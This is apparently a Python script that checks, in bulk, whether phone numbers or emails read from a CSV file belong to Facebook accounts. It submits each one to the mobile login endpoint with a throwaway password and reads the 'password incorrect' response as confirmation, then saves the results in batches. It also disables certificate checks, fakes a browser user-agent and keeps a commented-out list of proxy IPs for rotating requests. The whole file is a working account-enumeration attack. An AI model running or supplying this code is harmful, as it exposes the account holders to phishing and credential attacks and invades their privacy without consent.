import requests
import json
import re
import csv
import time
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

https_proxy = ["https://201.33.227.187:3128", "https://109.161.48.228:53281",
               "https://191.252.194.132:3128", "https://194.126.183.141:53281",
               "https://125.25.33.95:8080", "https://152.250.251.183:20183",
               "https:// 46.101.105.127:8080", "https:// 74.82.50.155:3128"];
index = 0;
def userExists(identity):
    global index;
    try:
        headers = {};
        headers["accept-language"] = "en-GB,en-US;q=0.9,en;q=0.8"
        headers["content-type"] = "application/x-www-form-urlencoded"    
        headers["user-agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"

        formdata = {"email" : identity, "pass" : "dsaasdsa", "prefill_contact_point" : identity}
        url = "https://m.facebook.com/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2F&lwv=100";
        #length = len(https_proxy);
        #proxy = https_proxy[index % length];
        #print(proxy);
        #proxydict = {}
        #proxydict["https"] = proxy;
        htmlResponse =  requests.post(url, data = formdata, headers = headers, verify=False);
        #print(htmlResponse);
        #print(htmlResponse.content);
        exp = re.match(r'(?is).*(m_login_notice.*The password you entered is incorrect)' , str(htmlResponse.content));
    except Exception as ex:
        print(ex);
        return None;
    if exp :
        return True;
    else :
        return False;

def saveToFile(data):
    with open('fbUserInfo2.csv', 'a') as csvfile:
        fieldnames =['user', 'exists'];
        writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
        writer.writeheader()
        for entries in data:
            writer.writerow(entries)

print("START");
#userExists();

#with open('fbUserInfo.csv', 'a') as csvfile:
#    fieldnames = ['user', 'exists'];
#    writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
#    writer.writeheader()
    
finalData = [];
print(time.time());
with open('Nishant_Mobile2.csv', 'r') as csvfile:
    textReader = csv.reader(csvfile, delimiter=' ', quotechar='|')
    for row in textReader:
        exists = userExists(row[0]);
        
        index = index + 1;
        print(index);
        print(row[0]);
        print(exists);
        userInfo = {};
        userInfo["user"] = row[0];
        if exists == None:
            continue;

        userInfo['exists'] = exists;
        finalData.append(userInfo);

        print("\n **********");
        if len(finalData) >= 100 :
            print(time.time());
            print("\n************************* Going to write in csv file **************")
            print(finalData);
            saveToFile(finalData);
            finalData = [];
